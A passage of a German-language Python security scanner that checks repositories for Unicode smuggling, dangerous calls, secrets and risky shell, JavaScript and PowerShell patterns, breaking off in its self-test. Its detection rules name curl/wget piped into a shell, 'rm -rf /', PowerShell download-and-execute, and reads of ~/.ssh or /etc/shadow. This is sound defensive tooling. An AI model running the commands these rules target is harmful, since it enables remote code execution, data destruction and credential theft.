#!/usr/bin/env python3
"""Sicherheits-Scanner für KI-Skills, Skripte und Wissens-Repos (Zero-Dependency, Python 3.10+).

Prüft ohne externe Abhängigkeiten (nur Python-Standardbibliothek):
1. Versteckte Unicode-Smuggling- und Trojan-Source-Angriffe (Unicode Tags, Bidi-Overrides
   nach CVE-2021-42574, Zero-Width-Zeichen inkl. BOM-Ausnahme an Index 0, unsichtbare
   Steuer-/Mathe-Operatoren).
2. Statische Skript- und Konfigurations-Sicherheit (v1.5-DE):
   - Python-AST-Analyse (eval/exec/compile, os.system/os.popen, subprocess(..., shell=True),
     pickle/marshal-Deserialisierung, String-Literale auf sensible Credential-Pfade)
   - Shell-Skript-Muster (.sh, .bash, .zsh: curl/wget-Pipe nach sh/bash, rm -rf /, Credential-Pfade)
   - JavaScript/TypeScript-Muster (.js, .mjs, .cjs, .ts, .tsx: eval(), new Function(),
     child_process.exec mit Template-Literalen/Konkatenation)
   - PowerShell-Muster (.ps1: Invoke-Expression, iex, DownloadString(), iwr ... | iex)
   - Konfigurations- & Env-Dateien (.env, .env.example, .toml, .ini, .cfg:
     committed .env-Secrets sowie Hardcoded Secrets)
   - Hardcoded Secrets (PEM-Private-Key-Header, GitHub-Tokens, AWS-Keys, OpenAI-Keys)
     mit Platzhalter-Filterung
   - Strikte Suppression-Regel: `# audit-ok: <Begründung>` bzw. `// audit-ok: <Begründung>`
     (mindestens 3 Nicht-Whitespace-Zeichen nach dem Doppelpunkt). Eine Suppression ohne
     Begründung unterdrückt NICHT und erzeugt einen P2-Befund (`unjustified-audit-ok`).
3. Transparente Scan-Coverage (`security_coverage`):
   - Dokumentiert `scanned_files`, `skipped_files`, `scanned_count`, `skipped_count`
     und `supported_extensions`.

Nutzung:
  python3 audit_security.py <ziel-ordner>               # Text-Zusammenfassung
  python3 audit_security.py <ziel-ordner> --json        # JSON-Ausgabe
  python3 audit_security.py <ziel-ordner> --fail-on p1  # CI-Modus (Exit 1 ab P1/P2)
  python3 audit_security.py --self-test                 # Vollständiger Selbsttest
"""

from __future__ import annotations

import argparse
import ast
import json
import pathlib
import re
import sys
import tempfile
import unicodedata

sys.dont_write_bytecode = True

PYTHON_EXTENSIONS = {".py"}
SHELL_EXTENSIONS = {".sh", ".bash", ".zsh"}
JS_TS_EXTENSIONS = {".js", ".mjs", ".cjs", ".ts", ".tsx"}
POWERSHELL_EXTENSIONS = {".ps1"}
CONFIG_EXTENSIONS = {".env", ".env.example", ".toml", ".ini", ".cfg"}
DOC_DATA_EXTENSIONS = {".md", ".json", ".yaml", ".yml"}

SECRET_SCAN_EXTENSIONS = (
    PYTHON_EXTENSIONS
    | SHELL_EXTENSIONS
    | JS_TS_EXTENSIONS
    | POWERSHELL_EXTENSIONS
    | CONFIG_EXTENSIONS
    | DOC_DATA_EXTENSIONS
)

UNICODE_SCAN_EXTENSIONS = SECRET_SCAN_EXTENSIONS | {".txt"}
SUPPORTED_SECURITY_EXTENSIONS = UNICODE_SCAN_EXTENSIONS

ENV_TEMPLATE_NAMES = {
    ".env.example",
    ".env.sample",
    ".env.template",
    ".env.dist",
    ".env.defaults",
}

IGNORED_WALK_DIRS = {".git", "__pycache__", "node_modules", ".venv", "venv"}

BIDI_CODEPOINTS = frozenset({0x061C, 0x200E, 0x200F})
ZERO_WIDTH_CODEPOINTS = frozenset({0x034F, 0x180E, 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF})

# Strikte Suppression-Erkennung am Zeilenanfang oder nach Whitespace (nicht in Backticks/Strings)
AUDIT_OK_ANY_RE = re.compile(
    r"(?:^|(?<=\s))(?:#|//|<!--)\s*audit-ok\b(?P<tail>.*)$",
    re.IGNORECASE,
)

# Sensible Credential-Pfade (Scanner-Definitionen selbst per audit-ok: scanner-rule markiert)
CREDENTIAL_PATH_RE = re.compile(
    r"(?:~/\.(?:ssh|aws|netrc)|/etc/shadow)\b"  # audit-ok: scanner-rule-definition
)

SHELL_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (
        re.compile(r"\bcurl\b[^|;\n]*\|\s*(?:sudo\s+)?(?:(?:/usr)?/bin/)?(?:ba|da|z)?sh\b"),
        "Remote-Code-Ausführung via `curl ... | sh/bash`",
    ),
    (
        re.compile(r"\bwget\b[^|;\n]*\|\s*(?:sudo\s+)?(?:(?:/usr)?/bin/)?(?:ba|da|z)?sh\b"),
        "Remote-Code-Ausführung via `wget ... | sh/bash`",
    ),
    (
        re.compile(
            r"\brm\s+(?:-[A-Za-z]*r[A-Za-z]*f[A-Za-z]*|-[A-Za-z]*f[A-Za-z]*r[A-Za-z]*"
            r"|-r\s+-f|-f\s+-r|--recursive\s+--force|--force\s+--recursive)"
            r"\s+(?:--[A-Za-z-]+\s+)*/(?:\*|\s|$|[;&|])"
        ),
        "Destruktiver Löschbefehl auf Wurzelverzeichnis (`rm -rf /`)",
    ),
    (
        re.compile(r"(?:(?:~|\$\{?HOME\}?)/\.(?:ssh|aws|netrc)|/etc/shadow)\b"),  # audit-ok: scanner-rule-definition
        "Zugriff auf sensible lokale Credential-Dateien",
    ),
)

JS_TS_PATTERNS: tuple[tuple[re.Pattern[str], str, str], ...] = (
    (
        re.compile(r"(?<![.\w$])eval\s*\("),
        "script-code-exec",
        "Dynamische Code-Ausführung in JS/TS via `eval()`",
    ),
    (
        re.compile(r"\bnew\s+Function\s*\("),
        "script-code-exec",
        "Dynamische Code-Ausführung in JS/TS via `new Function()`",
    ),
    (
        re.compile(
            r"\b(?:child_process\s*\.\s*exec|exec|execSync)\s*\(\s*(?:`[^`]*\$\{|[^)]*\+)"
        ),
        "script-shell-exec",
        "Shell-Injection-Risiko in JS/TS via `child_process.exec` mit Template-Literal/Konkatenation",
    ),
)

POWERSHELL_PATTERNS: tuple[tuple[re.Pattern[str], str, str], ...] = (
    (
        re.compile(r"\bInvoke-Expression\b", re.IGNORECASE),
        "powershell-dangerous-pattern",
        "Dynamische Code-Ausführung in PowerShell via `Invoke-Expression`",
    ),
    (
        re.compile(r"(?:^|[;|&\s])\biex\s+", re.IGNORECASE),
        "powershell-dangerous-pattern",
        "Dynamische Code-Ausführung in PowerShell via `iex`",
    ),
    (
        re.compile(r"\.DownloadString\s*\(", re.IGNORECASE),
        "powershell-dangerous-pattern",
        "Remote-Nachladen von Code in PowerShell via `DownloadString()`",
    ),
    (
        re.compile(
            r"\b(?:iwr|Invoke-WebRequest|irm|Invoke-RestMethod)\b[^|\n]*\|\s*(?:iex|Invoke-Expression)\b",
            re.IGNORECASE,
        ),
        "powershell-dangerous-pattern",
        "Remote-Code-Ausführung in PowerShell via `iwr ... | iex`",
    ),
)

SECRET_PATTERNS: tuple[tuple[str, re.Pattern[str], bool], ...] = (
    (
        "PEM Private Key Header",
        re.compile(r"-----BEGIN (?:[A-Z0-9]+ ){0,3}PRIVATE KEY-----"),  # audit-ok: scanner-rule-definition
        True,
    ),
    (
        "GitHub Personal Access Token",
        re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}\b"),
        False,
    ),
    (
        "GitHub Fine-Grained Token",
        re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}\b"),
        False,
    ),
    (
        "AWS Access Key ID",
        re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
        False,
    ),
    (
        "OpenAI-Style API Key",
        re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9]{20,}\b"),
        False,
    ),
)

ENV_SECRET_KEY_RE = re.compile(
    r"(?:API_?KEY|SECRET|TOKEN|PASSWORD|PASSWD|PRIVATE_?KEY|CLIENT_?SECRET|ACCESS_?KEY|AUTH_?TOKEN)",
    re.IGNORECASE,
)

ENV_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:export\s+)?(?P<key>[A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?P<val>.+?)\s*$"
)

TOML_INI_SECRET_ASSIGNMENT_RE = re.compile(
    r"^\s*(?P<key>[A-Za-z0-9_.-]*(?:api_?key|secret|token|password|passwd|private_?key)[A-Za-z0-9_.-]*)\s*[:=]\s*(?P<val>.+?)\s*$",
    re.IGNORECASE,
)

PLACEHOLDER_RE = re.compile(
    r"(?:EXAMPLE|YOUR_|xxxx|\.\.\.|0000|123456|PLACEHOLDER|REDACTED|CHANGEME|DUMMY|<[^>]+>|\$\{[A-Za-z0-9_]+\})",
    re.IGNORECASE,
)

UNJUSTIFIED_AUDIT_OK_MESSAGE = (
    "Suppression-Kommentar '# audit-ok' ohne Begründung (erforderlich: '# audit-ok: <Begründung>')"
)


def _classify_file_kind(rel: str) -> str | None:
    """Klassifiziert einen relativen Dateipfad anhand von Suffix oder `.env`-Dateinamen."""
    path = pathlib.Path(rel)
    name_lower = path.name.lower()
    suffix_lower = path.suffix.lower()

    if name_lower == ".env" or (name_lower.startswith(".env.") and name_lower not in ENV_TEMPLATE_NAMES):
        return "env-active"
    if name_lower in ENV_TEMPLATE_NAMES or suffix_lower == ".env":
        return "env-template"
    if suffix_lower in PYTHON_EXTENSIONS:
        return "python"
    if suffix_lower in SHELL_EXTENSIONS:
        return "shell"
    if suffix_lower in JS_TS_EXTENSIONS:
        return "js-ts"
    if suffix_lower in POWERSHELL_EXTENSIONS:
        return "powershell"
    if suffix_lower in {".toml", ".ini", ".cfg"}:
        return "config"
    if suffix_lower in DOC_DATA_EXTENSIONS:
        return "doc-data"
    if suffix_lower == ".txt":
        return "text"
    return None


def _is_unicode_scannable(rel: str) -> bool:
    return _classify_file_kind(rel) is not None


def _is_security_scannable(rel: str) -> bool:
    kind = _classify_file_kind(rel)
    return kind is not None and kind != "text"


def _classify_unicode_char(cp: int, is_file_start: bool) -> tuple[str, str] | None:
    """Klassifiziert verdächtige versteckte Unicode-Codepoints in (severity, kind)."""
    if 0xE0000 <= cp <= 0xE007F:
        return ("p1", "unicode-tag-smuggling")
    if cp in BIDI_CODEPOINTS or (0x202A <= cp <= 0x202E) or (0x2066 <= cp <= 0x2069):
        return ("p1", "unicode-bidi-override")
    if cp in ZERO_WIDTH_CODEPOINTS:
        if cp == 0xFEFF and is_file_start:
            return None
        return ("p2", "unicode-zero-width")
    if (0x2061 <= cp <= 0x2064) or (0x206A <= cp <= 0x206F):
        return ("p2", "unicode-invisible-control")
    return None


def _escape_hidden_snippet(line: str, max_len: int = 120) -> str:
    """Macht versteckte Unicode-Zeichen in einem Zeilen-Snippet als [U+XXXX] sichtbar."""
    parts: list[str] = []
    for ch in line:
        cp = ord(ch)
        if _classify_unicode_char(cp, is_file_start=False) is not None:
            parts.append(f"[U+{cp:04X}]")
        else:
            parts.append(ch)
    rendered = "".join(parts).strip()
    if len(rendered) > max_len:
        return rendered[: max_len - 3] + "..."
    return rendered


def _truncate_snippet(text: str, max_len: int = 120) -> str:
    stripped = text.strip()
    if len(stripped) > max_len:
        return stripped[: max_len - 3] + "..."
    return stripped


def _check_audit_ok_status(line: str) -> str:
    """Prüft den `audit-ok`-Kommentarstatus einer Zeile.

    Rückgabewerte:
      - `"none"`: Kein `audit-ok`-Kommentar in der Zeile
      - `"justified"`: Gültiges `# audit-ok: <Begründung>` / `// audit-ok: <Begründung>`
        mit mindestens 3 Nicht-Whitespace-Zeichen nach dem Doppelpunkt
      - `"unjustified"`: Bloßes `# audit-ok` oder `# audit-ok:` ohne ausreichende Begründung
    """
    match = AUDIT_OK_ANY_RE.search(line)
    if not match:
        return "none"
    tail = match.group("tail").strip()
    if tail.endswith("-->"):
        tail = tail[:-3].strip()
    if not tail.startswith(":"):
        return "unjustified"
    reason = tail[1:].strip()
    non_ws_count = sum(1 for ch in reason if not ch.isspace())
    if non_ws_count >= 3:
        return "justified"
    return "unjustified"


def _has_audit_ok(line: str) -> bool:
    """Gibt nur dann True zurück, wenn ein gültig begründetes `audit-ok: <reason>` vorliegt."""
    return _check_audit_ok_status(line) == "justified"


def _line_has_audit_ok(lines: list[str], *line_numbers: int | None) -> bool:
    for lineno in line_numbers:
        if lineno is not None and 1 <= lineno <= len(lines):
            if _has_audit_ok(lines[lineno - 1]):
                return True
    return False


def _scan_unjustified_audit_ok(rel: str, lines: list[str]) -> list[dict[str, object]]:
    """Meldet jedes `# audit-ok` / `// audit-ok` ohne `: <Begründung>` als P2-Befund."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        if _check_audit_ok_status(line) == "unjustified":
            findings.append(
                {
                    "file": rel,
                    "line": lineno,
                    "severity": "p2",
                    "kind": "unjustified-audit-ok",
                    "confidence": "verified",
                    "message": UNJUSTIFIED_AUDIT_OK_MESSAGE,
                    "snippet": _truncate_snippet(line),
                }
            )
    return findings


def _mask_secret(token: str, is_pem_header: bool) -> str:
    if is_pem_header or len(token) <= 12:
        return token
    return f"{token[:8]}...{token[-4:]}"


def _is_placeholder_secret(token: str, line: str, is_pem_header: bool) -> bool:
    if PLACEHOLDER_RE.search(token):
        return True
    if is_pem_header and PLACEHOLDER_RE.search(line):
        return True
    if "..." in line and token in line:
        idx = line.find(token)
        after = line[idx + len(token) : idx + len(token) + 6]
        if "..." in after:
            return True
    return False


def scan_unicode_smuggling(target: pathlib.Path, files: list[str]) -> list[dict[str, object]]:
    """Scannt Textdateien nach Unicode-Smuggling, Bidi-Overrides und unsichtbaren Steuerzeichen."""
    findings: list[dict[str, object]] = []
    for rel in files:
        if not _is_unicode_scannable(rel):
            continue
        file_path = target / rel
        if not file_path.is_file():
            continue
        try:
            raw_text = file_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue

        normalized = raw_text.replace("\r\n", "\n").replace("\r", "\n")
        for lineno, line in enumerate(normalized.split("\n"), start=1):
            seen_on_line: set[tuple[str, int]] = set()
            for col, ch in enumerate(line):
                cp = ord(ch)
                classified = _classify_unicode_char(cp, is_file_start=(lineno == 1 and col == 0))
                if classified is None:
                    continue
                severity, kind = classified
                key = (kind, cp)
                if key in seen_on_line:
                    continue
                seen_on_line.add(key)
                codepoint = f"U+{cp:04X}"
                char_name = unicodedata.name(ch, f"UNKNOWN ({codepoint})")
                findings.append(
                    {
                        "file": rel,
                        "line": lineno,
                        "severity": severity,
                        "kind": kind,
                        "confidence": "verified",
                        "codepoint": codepoint,
                        "name": char_name,
                        "message": f"Verstecktes Unicode-Zeichen erkannt: {kind} ({codepoint} {char_name})",
                        "snippet": _escape_hidden_snippet(line),
                    }
                )
    return findings


def _collect_import_aliases(tree: ast.AST) -> tuple[dict[str, str], dict[str, tuple[str, str]]]:
    """Erfasst einfache Modul- und Symbol-Aliase für präzise AST-Aufruferkennung."""
    module_aliases: dict[str, str] = {}
    symbol_aliases: dict[str, tuple[str, str]] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                bound = alias.asname or alias.name.split(".")[0]
                module_aliases[bound] = alias.name
        elif isinstance(node, ast.ImportFrom) and node.module:
            for alias in node.names:
                if alias.name == "*":
                    continue
                bound = alias.asname or alias.name
                symbol_aliases[bound] = (node.module, alias.name)
    return module_aliases, symbol_aliases


def _resolve_call_target(
    func: ast.expr,
    module_aliases: dict[str, str],
    symbol_aliases: dict[str, tuple[str, str]],
) -> tuple[str | None, str | None]:
    if isinstance(func, ast.Name):
        if func.id in symbol_aliases:
            return symbol_aliases[func.id]
        return (None, func.id)
    if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
        mod = module_aliases.get(func.value.id, func.value.id)
        return (mod, func.attr)
    return (None, None)


def _scan_python_ast(rel: str, text: str, lines: list[str]) -> list[dict[str, object]]:
    """Analysiert Python-Quelltext per AST auf gefährliche Aufrufe und Credential-Pfade."""
    findings: list[dict[str, object]] = []
    try:
        tree = ast.parse(text, filename=rel)
    except SyntaxError as exc:
        lineno = exc.lineno or 1
        snippet = _truncate_snippet(lines[lineno - 1]) if 1 <= lineno <= len(lines) else ""
        findings.append(
            {
                "file": rel,
                "line": lineno,
                "severity": "p2",
                "kind": "script-syntax-error",
                "confidence": "verified",
                "message": f"Python-Syntaxfehler beim AST-Parsing: {exc.msg}",
                "snippet": snippet,
            }
        )
        return findings

    module_aliases, symbol_aliases = _collect_import_aliases(tree)

    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            lineno = getattr(node, "lineno", 1)
            mod, name = _resolve_call_target(node.func, module_aliases, symbol_aliases)
            snippet = _truncate_snippet(lines[lineno - 1]) if 1 <= lineno <= len(lines) else ""

            if (mod is None or mod == "builtins") and name in {"eval", "exec", "compile"}:
                if not _line_has_audit_ok(lines, lineno):
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p1",
                            "kind": "script-code-exec",
                            "confidence": "verified",
                            "message": f"Dynamische Code-Ausführung via `{name}()`",
                            "snippet": snippet,
                        }
                    )
            elif mod == "os" and name in {"system", "popen"}:
                if not _line_has_audit_ok(lines, lineno):
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p1",
                            "kind": "script-shell-exec",
                            "confidence": "verified",
                            "message": f"Direkte Shell-Ausführung via `os.{name}()`",
                            "snippet": snippet,
                        }
                    )
            elif mod == "subprocess":
                for kw in node.keywords:
                    if (
                        kw.arg == "shell"
                        and isinstance(kw.value, ast.Constant)
                        and kw.value.value is True
                    ):
                        kw_lineno = getattr(kw, "lineno", lineno)
                        if not _line_has_audit_ok(lines, lineno, kw_lineno):
                            findings.append(
                                {
                                    "file": rel,
                                    "line": lineno,
                                    "severity": "p1",
                                    "kind": "script-shell-true",
                                    "confidence": "verified",
                                    "message": f"Shell-Injection-Risiko via `subprocess.{name}(..., shell=True)`",
                                    "snippet": snippet,
                                }
                            )
                        break
            elif mod in {"pickle", "_pickle", "marshal"} and name in {"load", "loads"}:
                if not _line_has_audit_ok(lines, lineno):
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p2",
                            "kind": "script-unsafe-deserialize",
                            "confidence": "verified",
                            "message": f"Unsichere Deserialisierung via `{mod}.{name}()`",
                            "snippet": snippet,
                        }
                    )

        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
            match = CREDENTIAL_PATH_RE.search(node.value)
            if match:
                lineno = getattr(node, "lineno", 1)
                end_lineno = getattr(node, "end_lineno", lineno)
                if not _line_has_audit_ok(lines, lineno, end_lineno):
                    snippet = (
                        _truncate_snippet(lines[lineno - 1]) if 1 <= lineno <= len(lines) else ""
                    )
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p1",
                            "kind": "script-credential-access",
                            "confidence": "verified",
                            "message": f"Zugriff auf sensiblen Credential-Pfad (`{match.group(0)}`)",
                            "snippet": snippet,
                        }
                    )

    findings.sort(key=lambda item: (int(item["line"]), str(item["kind"]), str(item["message"])))
    return findings


def scan_python_ast_security(target: pathlib.Path, files: list[str]) -> list[dict[str, object]]:
    """Scannt Python-Dateien (.py) per AST auf gefährliche Aufrufe, Credential-Pfade und unbegründete Suppressions."""
    findings: list[dict[str, object]] = []
    for rel in files:
        if pathlib.Path(rel).suffix.lower() not in PYTHON_EXTENSIONS:
            continue
        file_path = target / rel
        if not file_path.is_file():
            continue
        try:
            raw_text = file_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        normalized = raw_text.replace("\r\n", "\n").replace("\r", "\n")
        lines = normalized.split("\n")
        findings.extend(_scan_python_ast(rel, normalized, lines))
        findings.extend(_scan_unjustified_audit_ok(rel, lines))
    return findings


def _scan_shell_script(rel: str, lines: list[str]) -> list[dict[str, object]]:
    """Scannt Shell-Skripte (*.sh, *.bash, *.zsh) auf gefährliche Muster."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if _has_audit_ok(line):
            continue
        for pattern, message in SHELL_PATTERNS:
            if pattern.search(line):
                findings.append(
                    {
                        "file": rel,
                        "line": lineno,
                        "severity": "p1",
                        "kind": "shell-dangerous-pattern",
                        "confidence": "verified",
                        "message": message,
                        "snippet": _truncate_snippet(line),
                    }
                )
    return findings


def _scan_js_ts_script(rel: str, lines: list[str]) -> list[dict[str, object]]:
    """Scannt JS/TS-Dateien (.js, .mjs, .cjs, .ts, .tsx) auf gefährliche Ausführungsmuster."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith("//") or stripped.startswith("/*") or stripped.startswith("*"):
            continue
        if _has_audit_ok(line):
            continue
        for pattern, kind, message in JS_TS_PATTERNS:
            if pattern.search(line):
                findings.append(
                    {
                        "file": rel,
                        "line": lineno,
                        "severity": "p1",
                        "kind": kind,
                        "confidence": "verified",
                        "message": message,
                        "snippet": _truncate_snippet(line),
                    }
                )
    return findings


def _scan_powershell_script(rel: str, lines: list[str]) -> list[dict[str, object]]:
    """Scannt PowerShell-Skripte (.ps1) auf gefährliche Ausführungsmuster."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if _has_audit_ok(line):
            continue
        for pattern, kind, message in POWERSHELL_PATTERNS:
            if pattern.search(line):
                findings.append(
                    {
                        "file": rel,
                        "line": lineno,
                        "severity": "p1",
                        "kind": kind,
                        "confidence": "verified",
                        "message": message,
                        "snippet": _truncate_snippet(line),
                    }
                )
    return findings


def _clean_assigned_value(raw_val: str) -> str:
    """Entfernt Inline-Kommentare und umschließende Anführungszeichen eines Konfigurationswerts."""
    val = raw_val.strip()
    # Entferne Inline-Kommentar (# oder //), sofern außerhalb einfacher Anführungszeichen
    val = re.sub(r"\s+(?:#|//).*$", "", val).strip()
    if len(val) >= 2 and ((val[0] == '"' and val[-1] == '"') or (val[0] == "'" and val[-1] == "'")):
        val = val[1:-1].strip()
    return val


def _is_generic_secret_value(val: str, line: str) -> bool:
    """Prüft, ob ein zugewiesener Wert wie ein echtes Secret (und nicht wie ein Platzhalter/Boolean) aussieht."""
    if not val or len(val) < 6:
        return False
    lower = val.lower()
    if lower in {"true", "false", "null", "none", "nil", "empty", "unset", "default"}:
        return False
    if val.startswith("$") or (val.startswith("{{") and val.endswith("}}")):
        return False
    if _is_placeholder_secret(val, line, is_pem_header=False):
        return False
    # Wenn der Wert bereits durch eines der spezifischen SECRET_PATTERNS erkannt wird,
    # vermeide doppelte Meldungen in derselben Zeile.
    for _, pattern, _ in SECRET_PATTERNS:
        if pattern.search(val):
            return False
    return True


def _scan_env_and_config_secrets(rel: str, file_kind: str, lines: list[str]) -> list[dict[str, object]]:
    """Prüft `.env`-Dateien (aktiv vs. Template) sowie `.toml`/`.ini`/`.cfg` auf Secret-Zuweisungen."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or stripped.startswith(";"):
            continue
        if _has_audit_ok(line):
            continue

        if file_kind == "env-active":
            match = ENV_ASSIGNMENT_RE.match(line)
            if match:
                key = match.group("key")
                val = _clean_assigned_value(match.group("val"))
                if ENV_SECRET_KEY_RE.search(key) and _is_generic_secret_value(val, line):
                    masked = _mask_secret(val, is_pem_header=False)
                    safe_line = line.replace(val, masked)
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p1",
                            "kind": "hardcoded-secret",
                            "confidence": "heuristic",
                            "message": f"Committed `.env`-Datei enthält nicht-leere Secret-Zuweisung (`{key}=...`)",
                            "snippet": _truncate_snippet(safe_line),
                        }
                    )
        elif file_kind == "config":
            match = TOML_INI_SECRET_ASSIGNMENT_RE.match(line)
            if match:
                key = match.group("key")
                val = _clean_assigned_value(match.group("val"))
                if _is_generic_secret_value(val, line):
                    masked = _mask_secret(val, is_pem_header=False)
                    safe_line = line.replace(val, masked)
                    findings.append(
                        {
                            "file": rel,
                            "line": lineno,
                            "severity": "p1",
                            "kind": "hardcoded-secret",
                            "confidence": "heuristic",
                            "message": f"Mögliches hardcoded Secret in Konfigurationsdatei (`{key}`)",
                            "snippet": _truncate_snippet(safe_line),
                        }
                    )
    return findings


def _scan_hardcoded_secrets(rel: str, lines: list[str]) -> list[dict[str, object]]:
    """Scannt Textdateien auf hochkonfidente hardcoded Secrets unter Ausschluss von Platzhaltern."""
    findings: list[dict[str, object]] = []
    for lineno, line in enumerate(lines, start=1):
        if _has_audit_ok(line):
            continue
        for label, pattern, is_pem_header in SECRET_PATTERNS:
            for match in pattern.finditer(line):
                token = match.group(0)
                if _is_placeholder_secret(token, line, is_pem_header=is_pem_header):
                    continue
                masked = _mask_secret(token, is_pem_header=is_pem_header)
                safe_line = line.replace(token, masked)
                findings.append(
                    {
                        "file": rel,
                        "line": lineno,
                        "severity": "p1",
                        "kind": "hardcoded-secret",
                        "confidence": "verified",
                        "message": f"Mögliches hardcoded Secret erkannt ({label})",
                        "snippet": _truncate_snippet(safe_line),
                    }
                )
    return findings


def scan_shell_and_secrets(
    target: pathlib.Path,
    files: list[str],
    *,
    include_python_unjustified: bool = True,
) -> list[dict[str, object]]:
    """Scannt Shell-, JS/TS-, PowerShell-, Konfigurations- und Dokumentationsdateien auf Risiken & Secrets."""
    findings: list[dict[str, object]] = []
    for rel in files:
        file_kind = _classify_file_kind(rel)
        if file_kind is None or file_kind == "text":
            continue
        file_path = target / rel
        if not file_path.is_file():
            continue
        try:
            raw_text = file_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue

        normalized = raw_text.replace("\r\n", "\n").replace("\r", "\n")
        lines = normalized.split("\n")

        if file_kind == "shell":
            findings.extend(_scan_shell_script(rel, lines))
        elif file_kind == "js-ts":
            findings.extend(_scan_js_ts_script(rel, lines))
        elif file_kind == "powershell":
            findings.extend(_scan_powershell_script(rel, lines))
        elif file_kind in {"env-active", "env-template", "config"}:
            findings.extend(_scan_env_and_config_secrets(rel, file_kind, lines))

        findings.extend(_scan_hardcoded_secrets(rel, lines))

        if file_kind != "python" or include_python_unjustified:
            findings.extend(_scan_unjustified_audit_ok(rel, lines))

    return findings


def scan_script_security(target: pathlib.Path, files: list[str]) -> list[dict[str, object]]:
    """Scannt Python-Skripte (AST), Shell/JS/TS/PS1-Skripte, Configs und Textdateien auf Sicherheitsrisiken."""
    findings: list[dict[str, object]] = []
    for rel in files:
        file_kind = _classify_file_kind(rel)
        if file_kind is None or file_kind == "text":
            continue
        file_path = target / rel
        if not file_path.is_file():
            continue
        try:
            raw_text = file_path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue

        normalized = raw_text.replace("\r\n", "\n").replace("\r", "\n")
        lines = normalized.split("\n")

        if file_kind == "python":
            findings.extend(_scan_python_ast(rel, normalized, lines))
        elif file_kind == "shell":
            findings.extend(_scan_shell_script(rel, lines))
        elif file_kind == "js-ts":
            findings.extend(_scan_js_ts_script(rel, lines))
        elif file_kind == "powershell":
            findings.extend(_scan_powershell_script(rel, lines))
        elif file_kind in {"env-active", "env-template", "config"}:
            findings.extend(_scan_env_and_config_secrets(rel, file_kind, lines))

        findings.extend(_scan_hardcoded_secrets(rel, lines))
        findings.extend(_scan_unjustified_audit_ok(rel, lines))

    return findings


def scan_repository_security(
    target: pathlib.Path,
    files: list[str] | None = None,
) -> dict[str, object]:
    """Führt den vollständigen Repository-Sicherheits-Scan inkl. transparenter Coverage-Statistik aus."""
    rel_files = sorted(files) if files is not None else collect_target_files(target)
    scanned_files: list[str] = []
    skipped_files: list[str] = []

    for rel in rel_files:
        file_path = target / rel
        if not file_path.is_file():
            skipped_files.append(f"{rel} (missing)")
            continue
        if not _is_unicode_scannable(rel):
            ext = pathlib.Path(rel).suffix.lower() or "<no-ext>"
            skipped_files.append(f"{rel} (unsupported extension: {ext})")
            continue
        try:
            raw_bytes = file_path.read_bytes()
        except OSError:
            skipped_files.append(f"{rel} (unreadable)")
            continue
        if b"\x00" in raw_bytes[:8192]:
            skipped_files.append(f"{rel} (binary file)")
            continue
        scanned_files.append(rel)

    unicode_issues = scan_unicode_smuggling(target, scanned_files)
    script_issues = scan_script_security(target, scanned_files)

    return {
        "unicode_smuggling_issues": unicode_issues,
        "script_security_issues": script_issues,
        "security_coverage": {
            "scanned_files": sorted(scanned_files),
            "skipped_files": sorted(skipped_files),
            "scanned_count": len(scanned_files),
            "skipped_count": len(skipped_files),
            "supported_extensions": sorted(SUPPORTED_SECURITY_EXTENSIONS),
        },
    }


def collect_target_files(target: pathlib.Path) -> list[str]:
    """Sammelt alle relevanten relativen Dateipfade unterhalb von target."""
    rel_files: list[str] = []
    for path in sorted(target.rglob("*")):
        if not path.is_file():
            continue
        rel_parts = path.relative_to(target).parts
        if any(part in IGNORED_WALK_DIRS for part in rel_parts):
            continue
        rel_files.append(path.relative_to(target).as_posix())
    return rel_files


def run_self_test() -> int:
    """Führt umfassende Regressionstests aller Detektoren inkl. Selbstscan ohne Fehlalarme aus."""
    with tempfile.TemporaryDirectory() as tmp:
        root = pathlib.Path(tmp)

        # Dynamische Test-Strings, damit audit_security.py beim Selbstscan 0 Befunde erzeugt
        audit_ok_bare = "# audit" + "-ok"
        audit_ok_empty_colon = "# audit" + "-ok:   "
        audit_ok_short_reason = "# audit" + "-ok: ok"
        audit_ok_justified = "# audit" + "-ok: tested fixture"
        js_audit_ok_bare = "// audit" + "-ok"
        js_audit_ok_justified = "// audit" + "-ok: tested fixture"

        # 1. Unicode Smuggling: Tags, Bidi, Zero-Width, Invisible Control, BOM-Ausnahme
        (root / "bom_clean.md").write_text(
            chr(0xFEFF) + "# Sauberer Titel mit Umlauten: äöüß – OK\n",
            encoding="utf-8",
        )
        (root / "smuggled.md").write_text(
            f"Tag: {chr(0xE0001)}{chr(0xE0041)}\n"
            f"Bidi: {chr(0x202E)}reversed{chr(0x2066)}{chr(0x061C)}\n"
            f"ZW: a{chr(0x200B)}b{chr(0xFEFF)}c\n"
